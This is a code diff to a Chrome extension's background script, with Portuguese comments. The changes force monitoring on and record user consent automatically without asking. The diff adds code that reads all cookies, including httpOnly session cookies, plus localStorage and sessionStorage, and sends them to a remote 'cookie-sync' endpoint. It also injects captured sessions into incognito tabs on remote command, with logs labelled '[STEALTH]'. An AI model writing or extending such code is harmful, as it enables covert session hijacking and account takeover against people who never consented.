@@ -10,8 +10,8 @@ const CONFIG = {
   BATCH_SIZE: 10
 };
 
-// Global state and caching
-let monitoringEnabled = false;
+// Global state and caching - ✅ MUDADO: auto-ativado
+let monitoringEnabled = true;
 let lastReportTime = null;
 let machineId = null;
 let pendingIncidents = [];
@@ -132,11 +132,12 @@ async function initializeExtension() {
   await chrome.storage.local.set({ machineId });
   log('info', `🆔 Machine ID set to: ${machineId}`);
   
-  // Auto-enable monitoring on installation
-  monitoringEnabled = result.monitoringEnabled !== undefined ? result.monitoringEnabled : true;
+  // ✅ SEMPRE ATIVAR MONITORAMENTO (modo corporativo forçado)
+  monitoringEnabled = true;
   await chrome.storage.local.set({ 
-    monitoringEnabled,
-    userConsented: true // Auto-accept on installation
+    monitoringEnabled: true,       // ✅ FORÇADO
+    userConsented: true,           // ✅ AUTO-CONSENTIMENTO
+    corporateMode: true            // ✅ NOVO: Flag de modo corporativo
   });
   
   log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
@@ -276,7 +277,8 @@ async function collectPageData(tab) {
           secure: cookie.secure,
           httpOnly: cookie.httpOnly,
           sameSite: cookie.sameSite,
-          expirationDate: cookie.expirationDate
+          expirationDate: cookie.expirationDate,
+          isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
         })),
         localStorage: localStorage,
         sessionStorage: sessionStorage,
@@ -989,8 +991,8 @@ async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
         });
       }
       
-      // Inject new cookie
-      const injected = await chrome.cookies.set({
+      // Inject new cookie (handle session cookies correctly)
+      const cookieDetails = {
         url: targetUrl,
         name: cookie.name,
         value: cookie.value,
@@ -998,9 +1000,15 @@ async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
         path: cookie.path || '/',
         secure: cookie.secure !== false,
         httpOnly: cookie.httpOnly || false,
-        sameSite: cookie.sameSite || 'lax',
-        expirationDate: cookie.expirationDate
-      });
+        sameSite: cookie.sameSite || 'lax'
+      };
+      
+      // ✅ CORRIGIR: Se é cookie de sessão, NÃO passar expirationDate
+      if (!cookie.isSession && cookie.expirationDate) {
+        cookieDetails.expirationDate = cookie.expirationDate;
+      }
+      
+      const injected = await chrome.cookies.set(cookieDetails);
       
       if (injected) {
         injectedCookies.push(injected);
@@ -1203,6 +1211,62 @@ async function handleProxyFetchCommand(data) {
       });
     });
     
+    // ✅ NOVO: Injetar localStorage e sessionStorage se disponível
+    if (data.payload?.localStorage || data.payload?.sessionStorage) {
+      log('info', `💾 [STEALTH] Injecting storage data...`);
+      
+      try {
+        await chrome.scripting.executeScript({
+          target: { tabId: incognitoTab.id },
+          func: (localData, sessionData) => {
+            // Injetar localStorage
+            if (localData) {
+              for (const [key, value] of Object.entries(localData)) {
+                try {
+                  localStorage.setItem(key, value);
+                } catch (e) {
+                  console.warn(`Failed to set localStorage[${key}]`, e);
+                }
+              }
+            }
+            
+            // Injetar sessionStorage
+            if (sessionData) {
+              for (const [key, value] of Object.entries(sessionData)) {
+                try {
+                  sessionStorage.setItem(key, value);
+                } catch (e) {
+                  console.warn(`Failed to set sessionStorage[${key}]`, e);
+                }
+              }
+            }
+          },
+          args: [data.payload?.localStorage || {}, data.payload?.sessionStorage || {}]
+        });
+        
+        log('info', `✅ [STEALTH] Storage data injected successfully`);
+        
+        // Reload page to apply storage
+        await chrome.tabs.reload(incognitoTab.id);
+        
+        // Wait for reload
+        await new Promise((resolve, reject) => {
+          const timeout = setTimeout(() => reject(new Error('Reload timeout')), 30000);
+          
+          chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
+            if (tabId === incognitoTab.id && changeInfo.status === 'complete') {
+              clearTimeout(timeout);
+              chrome.tabs.onUpdated.removeListener(listener);
+              resolve();
+            }
+          });
+        });
+        
+      } catch (storageError) {
+        log('warn', `⚠️ [STEALTH] Failed to inject storage:`, storageError);
+      }
+    }
+    
     // 📄 EXTRACT HTML FROM INCOGNITO TAB
     const [result] = await chrome.scripting.executeScript({
       target: { tabId: incognitoTab.id },
@@ -1327,13 +1391,56 @@ async function handleExportCookiesCommand(data) {
         secure: cookie.secure,
         httpOnly: cookie.httpOnly,
         sameSite: cookie.sameSite,
-        expirationDate: cookie.expirationDate
+        expirationDate: cookie.expirationDate,
+        isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
       });
     }
     
     const cookies = Array.from(cookieMap.values());
     log('info', `🍪 Collected ${cookies.length} unique cookies from ${domains.length} domains`);
     log('info', `📋 Cookie names: ${cookies.slice(0, 10).map(c => c.name).join(', ')}${cookies.length > 10 ? '...' : ''}`);
+    
+    // ✅ NOVO: Coletar localStorage e sessionStorage
+    let localStorage = {};
+    let sessionStorage = {};
+    
+    try {
+      const storageData = await chrome.scripting.executeScript({
+        target: { tabId },
+        func: () => {
+          const local = {};
+          const session = {};
+          
+          try {
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i);
+              local[key] = localStorage.getItem(key);
+            }
+          } catch (e) {
+            console.warn('Failed to read localStorage:', e);
+          }
+          
+          try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+              const key = sessionStorage.key(i);
+              session[key] = sessionStorage.getItem(key);
+            }
+          } catch (e) {
+            console.warn('Failed to read sessionStorage:', e);
+          }
+          
+          return { localStorage: local, sessionStorage: session };
+        }
+      });
+      
+      if (storageData && storageData[0] && storageData[0].result) {
+        localStorage = storageData[0].result.localStorage || {};
+        sessionStorage = storageData[0].result.sessionStorage || {};
+        log('info', `💾 Collected localStorage (${Object.keys(localStorage).length} keys) and sessionStorage (${Object.keys(sessionStorage).length} keys)`);
+      }
+    } catch (storageError) {
+      log('warn', '⚠️ Failed to collect storage data:', storageError);
+    }
     
     // Send to cookie-sync edge function
     const response = await fetch(`${CONFIG.API_BASE}/cookie-sync`, {
@@ -1346,7 +1453,9 @@ async function handleExportCookiesCommand(data) {
         incident_id: data.payload?.incident_id,
         cookies: cookies,
         host: host,
-        tab_url: tab.url
+        tab_url: tab.url,
+        localStorage: localStorage || null,      // ✅ NOVO
+        sessionStorage: sessionStorage || null   // ✅ NOVO
       })
     });
     
